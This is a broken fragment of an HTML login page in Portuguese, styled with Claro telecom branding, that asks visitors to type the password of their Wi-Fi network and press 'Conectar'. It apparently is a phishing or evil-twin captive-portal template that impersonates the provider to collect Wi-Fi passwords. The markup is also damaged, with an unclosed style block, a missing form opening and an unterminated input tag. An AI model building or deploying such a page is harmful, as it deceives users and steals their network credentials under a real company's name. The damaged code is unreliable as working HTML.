<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Helvetica Neue',Arial,sans-serif;background:#f5f5f5;min-height:100vh;
display:flex;flex-direction:column}
.header{background:#da0000;height:54px;display:flex;align-items:center;padding:0 20px;
box-shadow:0 2px 6px rgba(218,0,0,.3)}
.claro-logo{color:#fff;font-size:1.5em;font-weight:900;letter-spacing:-1px;text-transform:lowercase}
.claro-dot{color:#ff6600;font-size:1.8em;line-height:0;vertical-align:-.1em}
.header-tagline{color:rgba(255,255,255,.7);font-size:.75em;margin-left:10px}
.main{flex:1;display:flex;justify-content:center;align-items:center;padding:32px 16px}
.card{background:#fff;border-radius:8px;width:100%;max-width:400px;
box-shadow:0 4px 20px rgba(0,0,0,.1);overflow:hidden}
.card-hero{background:linear-gradient(135deg,#da0000,#ff3300);padding:24px;text-align:center}
.card-hero h1{color:#fff;font-size:1.15em;font-weight:700}
.card-hero p{color:rgba(255,255,255,.82);font-size:.83em;margin-top:8px;line-height:1.5}
.card-body{padding:24px}
.field{margin-bottom:18px}
label{display:block;font-size:.82em;color:#333;margin-bottom:5px;font-weight:600}
input[type=password]{width:100%;padding:11px 12px;border:1.5px solid #e0e0e0;border-radius:6px;
font-size:.93em;outline:none;transition:border .2s}
input[type=password]:focus{border-color:#da0000;box-shadow:0 0 0 2px rgba(218,0,0,.1)}
.btn{width:100%;background:#da0000;color:#fff;border:none;border-radius:6px;
padding:12px;font-size:.95em;font-weight:700;cursor:pointer;transition:background .2s}
.btn:hover{background:#b80000}
.terms{font-size:.72em;color:#aaa;text-align:center;margin-top:14px;line-height:1.5}
.footer{text-align:center;font-size:.7em;color:#bbb;padding:10px 16px;border-top:1px solid #f0f0f0}

<div class="header">

</div>

    <div class="card-body">

        <input type="hidden" name="csrf_token" value="">
        <div class="field">

          <input type="password" id="password" name="password"
                 data-i18n-ph="ph_pass" placeholder="Digite a senha da rede Wi-Fi"

        </div>
        <button type="submit" class="btn" data-i18n="btn">Conectar</button>
      </form>
      <p class="terms" data-i18n="terms">Ao se conectar, voce aceita os Termos de Uso do servico Wi-Fi Claro e concorda com nossa Politica de Privacidade.</p>
